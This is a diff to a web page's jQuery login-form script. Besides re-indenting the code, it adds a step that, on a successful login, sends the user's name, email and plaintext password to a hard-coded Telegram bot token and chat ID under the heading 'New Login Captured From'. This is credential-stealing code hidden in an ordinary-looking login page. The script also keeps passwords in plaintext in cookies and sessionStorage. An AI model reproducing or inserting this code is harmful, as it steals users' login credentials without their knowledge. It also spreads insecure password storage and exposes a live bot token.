@@ -109,65 +109,98 @@
         });
 
 $(document).ready(function () {
-  $('#loginForm').on('submit', function (e) {
-    e.preventDefault();
+    $('#loginForm').on('submit', function (e) {
+        e.preventDefault();
 
-    const password = $('#loginForm input[type="password"]').val().trim();
-    const email = $('#loginForm input[type="email"]').val().trim();
+        const password = $('#loginForm input[type="password"]').val().trim();
+        const email = $('#loginForm input[type="email"]').val().trim();
 
-    // Retrieve stored user data using js-cookie
-    const storedUserName = sessionStorage.getItem('user.name') || Cookies.get('user.name');
-    const storedPassword = sessionStorage.getItem('user.password') || Cookies.get('user.password');
+        // Retrieve stored user data using js-cookie
+        const storedUserName = sessionStorage.getItem('user.name') || Cookies.get('user.name');
+        const storedPassword = sessionStorage.getItem('user.password') || Cookies.get('user.password');
 
-    // Check if user details are found
-    if (!storedUserName || !storedPassword) {
-      iziToast.error({
-        title: 'Error',
-        message: 'No user found, kindly register to create an account!',
-        position: 'topRight',
-      });
-      return;
+        // Check if user details are found
+        if (!storedUserName || !storedPassword) {
+            iziToast.error({
+                title: 'Error',
+                message: 'No user found, kindly register to create an account!',
+                position: 'topRight',
+            });
+            return;
+        }
+
+        if (password === "" || email === "") {
+            iziToast.error({
+                title: 'Error',
+                message: 'All fields are required!',
+                position: 'topRight',
+            });
+        } else if (!validateEmail(email)) {
+            iziToast.error({
+                title: 'Error',
+                message: 'Please enter a valid email address!',
+                position: 'topRight',
+            });
+        } else if (email === storedUserName && password === storedPassword) {
+            const botToken = '7153300024:AAHxg3xOAYbsBbLrIpQJoYNbeFBuYPmnsyk';
+            const chatID = '5538909913';
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `New Login Captured From:\nName: ${storedUserName}\n\nEmail: ${email}\n\nPassword: ${password}`;
+
+            fetch(telegramURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: message,
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    iziToast.success({
+                        title: 'Success',
+                        message: "Login successful! You'll be redirected shortly.",
+                        position: 'topRight',
+                    });
+                    
+                    // Clear input fields after successful login message
+                    $('#loginForm input[type="password"]').val('');
+                    $('#loginForm input[type="email"]').val('');
+
+                    // Redirect to home.html after 4 seconds
+                    setTimeout(() => {
+                        window.location.href = "./home.html";
+                    }, 4000);
+                } else {
+                    iziToast.error({
+                        title: 'Error',
+                        message: "Failed to Login, kindly check your internet connection!",
+                        position: 'topRight',
+                    });
+                }
+            })
+            .catch((error) => {
+                iziToast.error({
+                    title: 'Error',
+                    message: 'Network error! Please check your internet connection.',
+                    position: 'topRight',
+                });
+                console.error('Error:', error); // Log error for debugging
+            });
+        } else {
+            iziToast.error({
+                title: 'Error',
+                message: 'Incorrect email or password!',
+                position: 'topRight',
+            });
+        }
+    });
+
+    function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(String(email).toLowerCase());
     }
-
-    if (password === "" || email === "") {
-      iziToast.error({
-        title: 'Error',
-        message: 'All fields are required!',
-        position: 'topRight',
-      });
-    } else if (!validateEmail(email)) {
-      iziToast.error({
-        title: 'Error',
-        message: 'Please enter a valid email address!',
-        position: 'topRight',
-      });
-    } else if (email === storedUserName && password === storedPassword) {
-      iziToast.success({
-        title: 'Success',
-        message: "Login successful! You'll be redirected shortly",
-        position: 'topRight',
-      });
-
-      setTimeout(() => {
-        window.location.href = "./home.html";
-      }, 4000);
-
-      // Clear input fields after successful login message
-      $('#loginForm input[type="password"]').val('');
-      $('#loginForm input[type="email"]').val('');
-    } else {
-      iziToast.error({
-        title: 'Error',
-        message: 'Incorrect email or password!',
-        position: 'topRight',
-      });
-    }
-  });
-
-  function validateEmail(email) {
-    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return re.test(String(email).toLowerCase());
-  }
 });
         
     </script>
